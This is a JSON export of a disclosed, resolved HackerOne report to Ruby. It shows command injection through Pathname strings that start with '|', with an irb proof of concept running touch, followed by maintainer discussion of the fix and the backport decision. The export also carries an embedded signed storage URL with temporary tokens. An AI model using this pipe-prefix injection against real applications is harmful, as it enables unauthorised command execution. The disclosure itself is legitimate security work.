{"id":449482,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDk0ODI=","url":"https://hackerone.com/reports/449482","title":"Command injection in Pathname","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2018-11-25T07:57:29.658Z","submitted_at":"2018-11-25T07:57:29.658Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ooooooo_q","url":"/ooooooo_q","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7724,"url":"https://hackerone.com/ruby","handle":"ruby","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Ruby","twitter_handle":"","website":"https://www.ruby-lang.org","about":"A Programmer's Best Friend"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-01T11:52:19.817Z","bug_reporter_agreed_on_going_public_at":"2019-04-01T10:01:53.558Z","team_member_agreed_on_going_public_at":"2019-04-01T11:52:19.737Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The command may be executed when the value passed to Pathname is the first character of \"|\".\nThis is the same problem as https://bugs.ruby-lang.org/issues/14245, but here it is executed without warning.\n\n```ruby\n$ ruby -v\nruby 2.5.3p105 (2018-10-18 revision 65156) [x86_64-darwin16]\n\n$ irb\nirb(main):001:0\u003e `ls`\n=\u003e \"\"\n\nirb(main):002:0\u003e require 'pathname'\n=\u003e true\nirb(main):003:0\u003e Pathname(\"|touch binread\").binread\n=\u003e \"\"\nirb(main):004:0\u003e Pathname(\"|touch binwrite\").binwrite(\"\")\n=\u003e 0\nirb(main):005:0\u003e Pathname(\"|touch each_line\").each_line {|v| p v}\n=\u003e nil\nirb(main):006:0\u003e Pathname(\"|touch read\").read\n=\u003e \"\"\nirb(main):007:0\u003e Pathname(\"|touch readlines\").readlines\n=\u003e []\nirb(main):008:0\u003e Pathname(\"|touch write\").write(\"\")\n=\u003e 0\n\nirb(main):009:0\u003e `ls`\n=\u003e \"binread\\nbinwrite\\neach_line\\nread\\nreadlines\\nwrite\\n\"\n```\n\n## Impact\n\nThe command may be executed unintentionally.\n\nHowever, this is the same behavior as `IO` and can be inferred from the document.\nhttps://ruby-doc.org/stdlib-2.5.0/libdoc/pathname/rdoc/Pathname.html#class-Pathname-label-IO","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-05-01T10:01:53.635Z","allow_singular_disclosure_after":-77259570.09744377,"singular_disclosure_allowed":true,"vote_count":36,"voters":["backwards","bohdansec","ali","0xd0m7","amad3u6","cyanpiny","an0nym0us","rem1nd","khizer47","bhu","and 26 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3809835,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2018-12-12T00:22:15.837Z","updated_at":"2018-12-12T00:22:15.837Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150123Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f76a895cb7e66b5c9dd2dd30028fdb08d1934b2d3ab1d2ba0568209e5c1d10fe"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3810306,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2018-12-12T04:29:59.466Z","updated_at":"2018-12-12T04:29:59.466Z","actor":{"username":"tanaka_akr","cleared":false,"url":"/tanaka_akr","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3810374,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This behavior is inherited from class methods of IO.\nIt is documented bit in pathname: \"See IO.read.\"\n\nThe next release of Ruby (Ruby 2.6) will disable pipe execution for class methods of File\nbut class methods of IO still accept pipe execution.\nThis change is not considered to vulnerability fix.\n\nI agree that it is better to change the behavior.\nI.e. pathname should use class methods of File instead of IO.\n\nThis change follows Ruby's change,\nI think pathname change is not vulnerability fix as Ruby itself.\n\nI committed r66346.","automated_response":false,"created_at":"2018-12-12T05:08:38.798Z","updated_at":"2018-12-12T05:08:38.798Z","actor":{"username":"tanaka_akr","cleared":false,"url":"/tanaka_akr","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3897721,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tanaka_akr \n\nI confirmed that the command can not be executed in the released Ruby 2.6.\nCould you please disclose this report?","automated_response":false,"created_at":"2018-12-27T19:52:09.404Z","updated_at":"2018-12-27T19:52:09.404Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4363635,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ruby \nWill any corrections to this report apply to 2.5.x?\nAlso, is it possible to close the status and disclose it?","automated_response":false,"created_at":"2019-03-21T00:28:25.830Z","updated_at":"2019-03-21T00:28:25.830Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4364192,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\nI decided not to backport the changeset into ruby 2.5 branch.\nThe preceeding patch to forbid pipe in File.read (in other words, introduce independent implementation of File.read and stop just inherit IO.read) was not backported to 2.5 because the patch could introduce some incompatibilities in real applications. So backporting r66346 doesn't fix the issue but just introduce small incompatibility (ex: some tests should change stub target from `IO` to `File`).\n","automated_response":false,"created_at":"2019-03-21T05:03:32.023Z","updated_at":"2019-03-21T05:03:32.023Z","actor":{"username":"nagachika","cleared":false,"url":"/nagachika","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/083/779/e15fe1f06f0da36f48fe6f6c05cd634276decd2e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4376264,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nagachika \n\nhello.\nI understand that the fix is not backported to 2.5\n\nIf there is no further progress on this issue, would you like to publish this report, can you please?\n(If it remains private, it is difficult to mention outside of hackerone.)","automated_response":false,"created_at":"2019-03-23T03:17:13.268Z","updated_at":"2019-03-23T03:17:13.268Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4429773,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"So sorry for my late response. I close this issue.","automated_response":false,"created_at":"2019-04-01T01:21:16.842Z","updated_at":"2019-04-01T01:21:16.842Z","actor":{"username":"nagachika","cleared":false,"url":"/nagachika","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/083/779/e15fe1f06f0da36f48fe6f6c05cd634276decd2e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ooooooo_q","url":"/ooooooo_q"},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4431817,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-01T10:01:53.576Z","updated_at":"2019-04-01T10:01:53.576Z","first_to_agree":true,"actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4432734,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-01T11:52:19.753Z","updated_at":"2019-04-01T11:52:19.753Z","actor":{"username":"nagachika","cleared":false,"url":"/nagachika","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/083/779/e15fe1f06f0da36f48fe6f6c05cd634276decd2e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4432735,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-04-01T11:52:19.832Z","updated_at":"2019-04-01T11:52:19.832Z","actor":{"username":"nagachika","cleared":false,"url":"/nagachika","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/083/779/e15fe1f06f0da36f48fe6f6c05cd634276decd2e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4737510,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-05-03T20:59:19.528Z","updated_at":"2019-05-03T20:59:19.528Z","actor":{"url":"/ruby","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Ruby"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ruby","collaborator":{"username":"ooooooo_q","url":"/ooooooo_q"},"actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}